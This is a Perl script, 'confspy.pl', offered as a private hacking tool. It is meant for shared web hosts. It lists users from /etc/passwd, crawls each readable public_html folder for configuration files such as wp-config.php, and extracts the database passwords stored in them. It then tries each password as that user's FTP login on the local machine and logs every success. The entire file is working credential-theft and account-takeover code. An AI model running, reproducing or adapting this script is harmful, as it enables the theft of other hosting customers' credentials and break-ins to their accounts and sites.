#!/usr/bin/perl

# [!] confspy.pl v1.1 for /home/$user/public_html
# [!] Private Script !!!

# c0li.m0de.0n Begin !!!

# Please check ftp connection before enable it.
# 0=disable, 1=enable
my $ftp_login = 1;
my $datetime = localtime;

printf "\n
[o]=================================================[x]
 |            confspy.pl v1.0 by Vrs-hCk             |
 |             ander[at]antisecurity.org             |
 |       www.mainhack.net - www.antisecurity.org     |
[o]=================================================[o]
   Please wait ...
\n";

write_log('confspy.log',"[o]=================================================[x]\n".
                        " |            confspy.pl v1.0 by Vrs-hCk             |\n".
                        " |             ander[at]antisecurity.org             |\n".
                        " |       www.mainhack.net - www.antisecurity.org     |\n".
                        "[o]=================================================[o]\n".
                        "   Log Created : $datetime\n\n");

open(ETC_PASSWD, '/etc/passwd') or die("[!] Cannot open or read /etc/passwd !!\n");
@etc_passwd=<ETC_PASSWD>;
close(ETC_PASSWD);

my $total_pubdir = 0;
my $total_readable = 0;

while ($user_list = <@etc_passwd>) {
    my $pos = index($user_list,':');
    my $username = substr($user_list,0,$pos);
    my $public_path = '/home/'.$username.'/public_html';
    if (-d $public_path) {
        $total_pubdir++;
        if (-r $public_path) {
            $total_readable++;
            push(@users, $username);
        }
    }
}

print "[+] Total users public_html    : $total_pubdir\n";
print "[+] Total readable public_html : $total_readable\n\n";
print "[!] Searching for config files ...\n\n";
write_log('confspy.log',"[+] Total users public_html    : $total_pubdir\n".
                        "[+] Total readable public_html : $total_readable\n\n".
                        "[!] Searching for config files ...\n\n");

foreach $userid (@users) {
    my $userpath = '/home/'.$userid.'/public_html';
    &scan_config($userpath,$userid);
}

print "\n[!] Finish.\n\n";
write_log('confspy.log',"\n[+] Finish.\n\n");

sub scan_config {
    my $path = $_[0];
    my $user = $_[1];
    my @dir;
    opendir(DIR,$path);
    @dir = readdir(DIR);
    closedir DIR;
    foreach $file (@dir) {
        my $fullpath = $path."/".$file;
        if (-r $fullpath) {
            if (-d $fullpath) {
                if (($file ne ".") and ($file ne "..")) {
                    my $newdir = "$path/$file";
                    scan_config($newdir,$user);
                }
            }
            else {
                if (($file eq "conf.php")
                or ($file eq "config.php")
                or ($file eq "config.inc.php")
                or ($file eq "configuration.php")
                or ($file eq "configure.php")
                or ($file eq "conn.php")
                or ($file eq "connect.php")
                or ($file eq "connection.php")
                or ($file eq "connect.inc.php")
                or ($file eq "database.php")
                or ($file eq "dbconf.php")
                or ($file eq "dbconnect.php")
                or ($file eq "dbconnect.inc.php")
                or ($file eq "db_connection.inc.php")
                or ($file eq "db.inc.php")
                or ($file eq "db.php")
                or ($file eq "dbase.php")
                or ($file eq "setting.php")
                or ($file eq "settings.php")
                or ($file eq "setup.php")
                or ($file eq "index.php")
                or ($file eq "e107_config.php")
                or ($file eq "wp-config.php"))
                {
                    my $passwd = get_pass($fullpath);
                    if ($passwd != 1) {
                        if ($ftp_login) { &ftp_connect($user,$passwd); }
                    }
                }
            }
        }
    }
}

sub get_pass {
    my $filepath = $_[0];
    open(CONFIG, $filepath);
    while (<CONFIG>) {
        my($line) = $_;
        chomp($line);
        if (($line =~ m/pass(.*?)=(.*?)'(.+?)';/i)
        or ($line =~ m/pass(.*?)=(.*?)"(.+?)";/i)

        or ($line =~ m/pass(.*?),(.*?)'(.+?)'\);/i)
        or ($line =~ m/pass(.*?),(.*?)"(.+?)"\);/i)

        or ($line =~ m/pwd(.*?)=(.*?)'(.+?)';/i)
        or ($line =~ m/pwd(.*?)=(.*?)"(.+?)";/i))
        {
            my $pass = $3;
            if (($pass !~ / / ) and ($pass !~ /"/ ) and ($pass !~ /'/ )
            and ($pass !~ /_/ ) and ($pass !~ /\.\+\?/ )) {
                &write_log('confspy.log',"[+] $filepath\n[\@] $pass\n");
                return $pass;
            }
        }
    }
    close(CONFIG);
}

sub ftp_connect {
    my $usr = $_[0];
    my $pwd = $_[1];
    my $success = 1;
    use Net::FTP;
    my $ftp = Net::FTP->new("127.0.0.1", Debug => 0, Timeout => 2);
    $success = 0 if $ftp->login($usr,$pwd);
    $ftp->quit;
    if ($success == 0) {
        print "[FTP] $usr:$pwd -> success !!!\n";
        &write_log('confspy.log',"[FTP] $usr:$pwd -> success !!!\n");
    }
}

sub write_log {
    my $log = $_[0];
    my $data = $_[1];
    open(LOG,">>$log") or die("[!] Cannot create or open log file.\n");
    print LOG "$data";
    close(LOG);
}

# c0li.m0de.0n End !!!
